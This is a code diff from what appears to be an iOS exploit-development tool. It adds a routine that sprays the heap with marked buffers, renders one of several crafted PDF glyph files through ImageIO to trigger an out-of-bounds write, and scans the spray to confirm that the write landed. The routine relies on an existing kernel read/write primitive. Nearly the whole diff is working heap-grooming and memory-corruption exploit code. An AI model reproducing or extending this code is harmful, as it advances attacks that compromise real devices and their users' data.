@@ -875,4 +875,106 @@ static int kpncRemoveFlow(int fd, const uint8_t *flow) {
     return r;
 }
 
+
+// ---------------------------------------------------------------------------
+// R5j: Glyph + heap spray. One shot per boot (needs KRW for spray, but the
+// glyph render itself is ImageIO). Sprays user-heap with marked buffers,
+// renders the glyph, then scans for corruption. The corruption IS the write.
+// ---------------------------------------------------------------------------
+
++ (NSString *)glyphSprayReport {
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== R5j: Glyph + heap spray (one shot per boot) ===\n"];
+
+    if (!gPrimitives.kreadbuf) {
+        scopeNote(r, @"KRW not live — нужен эксплойт для спрея.");
+        return r;
+    }
+
+    // ---- 1. spray user heap with marked buffers ----
+    // MALLOC_SMALL class (from crash: 4MB regions). 4KB buffers, 0x41 fill.
+    enum { NBUFS = 4096, BUFSZ = 0x1000 };
+    void **bufs = calloc(NBUFS, sizeof(void *));
+    if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
+    int got = 0;
+    for (int i = 0; i < NBUFS; i++) {
+        void *b = malloc(BUFSZ);
+        if (!b) break;
+        memset(b, 0x41, BUFSZ);
+        *(uint64_t *)b = 0x4141414141414141ULL;
+        *(uint64_t *)(b + 8) = (uint64_t)i;   // index tag
+        bufs[i] = b;
+        got++;
+    }
+    scopeNote(r, [NSString stringWithFormat:@"  sprayed %d buffers x %d bytes (0x41) = %.1f MB",
+                  got, BUFSZ, got * BUFSZ / 1048576.0]);
+
+    // ---- 2. pick variant (disk cursor, same as R5i) ----
+    NSString *idxPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5h-idx.txt"];
+    int idx = 0;
+    { NSString *s = [NSString stringWithContentsOfFile:idxPath encoding:NSUTF8StringEncoding error:nil];
+      idx = s.intValue % 8; if (idx < 0) idx = 0;
+      [[NSString stringWithFormat:@"%d", s.intValue + 1] writeToFile:idxPath atomically:YES encoding:NSUTF8StringEncoding error:nil]; }
+    const char *names[8] = { "g1","g2","g3","g4","g5","g6","g7","g8" };
+    scopeNote(r, [NSString stringWithFormat:@"  VARIANT %d (%s)", idx, names[idx]]);
+
+    NSString *logPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5h-glyphgrift.txt"];
+    NSString *line = [NSString stringWithFormat:@"SPRAY+GLYPH VARIANT %d\n", idx];
+    { NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logPath];
+      if (fh) { [fh seekToEndOfFile]; [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } }
+
+    // ---- 3. render glyph (may panic) ----
+    NSString *name = [NSString stringWithFormat:@"%s", names[idx]];
+    NSString *path = [[NSBundle mainBundle] pathForResource:name ofType:@"pdf"];
+    if (!path) { scopeNote(r, @"pdf missing"); goto cleanup; }
+    {
+        NSURL *url = [NSURL fileURLWithPath:path];
+        CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
+        if (src) {
+            int sz = 256;
+            CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
+            const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
+                                   kCGImageSourceThumbnailMaxPixelSize };
+            const void *vals[] = { kCFBooleanTrue, szRef };
+            CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            scopeNote(r, @"  rendering glyph with spray live…");
+            CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
+            scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
+            if (img) CGImageRelease(img);
+            CFRelease(opts); CFRelease(szRef); CFRelease(src);
+        }
+    }
+
+    // ---- 4. scan spray for corruption ----
+    [r appendString:@"\n--- spray scan ---\n"];
+    int hits = 0;
+    for (int i = 0; i < got; i++) {
+        uint8_t *b = bufs[i];
+        if (!b) continue;
+        int dirty = 0;
+        for (int o = 0; o < BUFSZ; o++) if (b[o] != 0x41) { dirty = 1; break; }
+        if (dirty) {
+            hits++;
+            uint64_t tag = *(uint64_t *)(b + 8);
+            scopeNote(r, [NSString stringWithFormat:@"  HIT buffer %d (tag=%llu) first qwords: %016llx %016llx %016llx",
+                          i, (unsigned long long)tag,
+                          (unsigned long long)*(uint64_t *)b,
+                          (unsigned long long)*(uint64_t *)(b + 8),
+                          (unsigned long long)*(uint64_t *)(b + 16)]);
+        }
+    }
+    if (hits == 0) {
+        scopeNote(r, @"  no corruption in sprayed buffers — OOB не попал в спрей.");
+        scopeNote(r, @"  (возможно, вариант не того режима, или offset мимо)");
+    } else {
+        scopeNote(r, [NSString stringWithFormat:@"  >>> %d buffer(s) CORRUPTED — write landed in our spray!", hits]);
+    }
+
+cleanup:
+    for (int i = 0; i < got; i++) free(bufs[i]);
+    free(bufs);
+    return r;
+}
+
 @end
